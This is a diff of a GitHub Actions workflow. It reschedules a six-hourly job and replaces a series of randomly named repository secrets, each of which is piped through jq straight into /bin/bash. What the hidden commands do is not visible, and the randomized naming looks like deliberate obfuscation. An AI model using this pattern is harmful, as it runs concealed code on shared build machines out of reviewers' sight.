@@ -3,31 +3,22 @@ name: chenyatou0987
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 2/6 * * *'
-
-jobs:  # 17508
+    - cron: '38 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: chenyatou0987
         env:
-          xvf96354: ${{ secrets.xvf96354 }}
+          qfxfe51363: ${{ secrets.qfxfe51363 }}
         run: |
-          echo $xvf96354 | jq -r .lgid12342 | /bin/bash
-          echo $pdd76 | jq -r .boyao9013 | /bin/bash
-          echo $qcok5127 | jq -r .l75 | /bin/bash
-          echo $ld742 | jq -r .ulhoi52192 | /bin/bash
-          echo $vqwsu3030 | jq -r .iu63 | /bin/bash
-          echo $etwzn22 | jq -r .awj8 | /bin/bash
-          echo $xwt21 | jq -r .ls68516 | /bin/bash
-          echo $cmwj2 | jq -r .qmkt82501 | /bin/bash
-          echo $yr08980 | jq -r .jcv38978 | /bin/bash
-          echo $p9190 | jq -r .dri0 | /bin/bash
-          echo $bgeif898 | jq -r .rg961 | /bin/bash
-          echo $bst68 | jq -r .mvf3660 | /bin/bash
-          echo $ytotu1 | jq -r .msvzx43 | /bin/bash
-          echo $zi3954 | jq -r .ima7060 | /bin/bash
-          echo $rk62364 | jq -r .pklo94001 | /bin/bash
-          echo $zityx9 | jq -r .dab80 | /bin/bash
+          echo $qfxfe51363 | jq -r .bx1300 | /bin/bash
+          echo $wqqv9807 | jq -r .nijgv325 | /bin/bash
+          echo $mus64839 | jq -r .by133 | /bin/bash
+          echo $m25 | jq -r .dk64 | /bin/bash
+          echo $mo37 | jq -r .mbt310 | /bin/bash
+          echo $xejq026 | jq -r .e89135 | /bin/bash
+          echo $g2 | jq -r .fc5 | /bin/bash
+          echo $ld0 | jq -r .e3691 | /bin/bash
 
